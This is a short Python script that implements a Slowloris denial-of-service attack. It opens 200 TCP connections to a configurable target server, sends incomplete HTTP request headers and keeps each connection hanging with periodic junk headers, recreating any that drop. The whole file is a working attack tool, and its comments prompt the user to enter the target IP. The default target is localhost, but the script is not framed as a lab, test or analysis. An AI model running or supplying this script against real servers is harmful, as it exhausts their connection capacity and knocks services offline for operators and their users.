import socket
import time
import random
import threading

target = "127.0.0.1"   # Target Server IP here
port = 80              # Port number as you wish
socket_count = 200     # Number of sockets to hold open

list_of_sockets = []

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# IPv4 TCP sockets
        s.settimeout(4)    # If the server is unreachable, an error is produced. In absence of this, connect() could hang forever by default
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))    #Sending random headers
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: slowloris\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

# Fill socket list
print(f"[*] Creating {socket_count} sockets...")
for _ in range(socket_count):
    s = init_socket()
    if s:
        list_of_sockets.append(s)

# Keep sockets alive
while True:
    for s in list(list_of_sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        except socket.error:
            list_of_sockets.remove(s)

    # Recreate closed sockets
    for _ in range(socket_count - len(list_of_sockets)):
        s = init_socket()
        if s:
            list_of_sockets.append(s)

    time.sleep(15)
